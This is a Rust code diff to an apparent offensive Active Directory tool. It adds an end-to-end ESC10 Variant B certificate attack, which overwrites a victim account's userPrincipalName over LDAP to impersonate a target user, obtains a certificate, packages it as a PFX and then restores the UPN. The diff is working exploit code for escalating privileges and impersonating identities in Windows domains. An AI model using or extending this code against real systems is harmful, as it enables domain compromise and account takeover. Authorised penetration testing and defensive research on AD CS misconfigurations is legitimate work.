@@ -33,9 +33,11 @@
 //!
 //! Reference: Oliver Lyak, "Certificates and Pwnage and Patches" (2022)
 
+use crate::adcs::pfx::create_pfx;
 use crate::adcs::web_enrollment::WebEnrollmentClient;
 use crate::adcs::{IssuedCertificate, create_esc1_csr};
 use crate::error::{OverthroneError, Result};
+use crate::proto::ldap::LdapSession;
 use tracing::info;
 
 // ─────────────────────────────────────────────────────────
@@ -91,6 +93,8 @@ pub struct Esc10Config {
     pub target_upn: String,
     /// For Variant B: account whose UPN is temporarily overwritten
     pub victim_account: Option<String>,
+    /// For Variant B: DN of the victim account (required for live LDAP modification)
+    pub victim_dn: Option<String>,
     /// For Variant B: original UPN of the victim (for restoration)
     pub original_upn: Option<String>,
 }
@@ -196,9 +200,12 @@ impl Esc10Exploiter {
             },
         };
 
+        let pfx_data =
+            create_pfx(&cert_data, &private_key, None).unwrap_or_else(|_| cert_data.clone());
+
         Ok(Esc10Result {
             certificate: IssuedCertificate {
-                pfx_data: cert_data.clone(),
+                pfx_data,
                 thumbprint: Self::compute_thumbprint(&cert_data),
                 serial_number: Self::extract_serial(&cert_data).unwrap_or_default(),
                 valid_from: "Unknown".to_string(),
@@ -213,6 +220,63 @@ impl Esc10Exploiter {
             variant: config.variant.clone(),
             auth_hints,
         })
+    }
+
+    /// Perform an ESC10 Variant B attack end-to-end with a live LDAP session.
+    ///
+    /// Variant B requires temporarily overwriting a victim user's `userPrincipalName`
+    /// so that a certificate requested while the UPN is poisoned maps to `target_upn`
+    /// when the DC resolves it via the `CertificateMappingMethods` UPN match bit.
+    ///
+    /// This method:
+    /// 1. Writes `target_upn` to the victim's `userPrincipalName` via LDAP.
+    /// 2. Calls `exploit()` to request the certificate.
+    /// 3. Restores the original UPN (even on error paths).
+    ///
+    /// For Variant A the `exploit()` method is sufficient (no UPN modification needed).
+    pub async fn exploit_with_ldap(
+        &self,
+        config: &Esc10Config,
+        ldap: &mut LdapSession,
+    ) -> Result<Esc10Result> {
+        if config.variant != Esc10Variant::UPNMappingEnabled {
+            return Err(OverthroneError::Adcs(
+                "exploit_with_ldap is only needed for ESC10 Variant B (UPNMappingEnabled)"
+                    .to_string(),
+            ));
+        }
+
+        let victim_dn = config.victim_dn.as_deref().ok_or_else(|| {
+            OverthroneError::Adcs("ESC10 Variant B requires victim_dn".to_string())
+        })?;
+        let original_upn = config.original_upn.as_deref().ok_or_else(|| {
+            OverthroneError::Adcs("ESC10 Variant B requires original_upn".to_string())
+        })?;
+
+        // Step 1 — poison victim UPN
+        info!(
+            "ESC10B: Setting UPN of {} → {}",
+            victim_dn, config.target_upn
+        );
+        ldap.modify_replace(victim_dn, "userPrincipalName", config.target_upn.as_bytes())
+            .await
+            .map_err(|e| OverthroneError::Adcs(format!("ESC10B: UPN write failed: {e}")))?;
+
+        // Step 2 — request certificate
+        let cert_result = self.exploit(config).await;
+
+        // Step 3 — restore UPN
+        info!("ESC10B: Restoring UPN of {} → {}", victim_dn, original_upn);
+        if let Err(e) = ldap
+            .modify_replace(victim_dn, "userPrincipalName", original_upn.as_bytes())
+            .await
+        {
+            tracing::warn!(
+                "ESC10B: UPN restoration failed for {victim_dn}: {e} — manual cleanup required"
+            );
+        }
+
+        cert_result
     }
 
     /// Check whether the DC registry indicates ESC10 Variant A
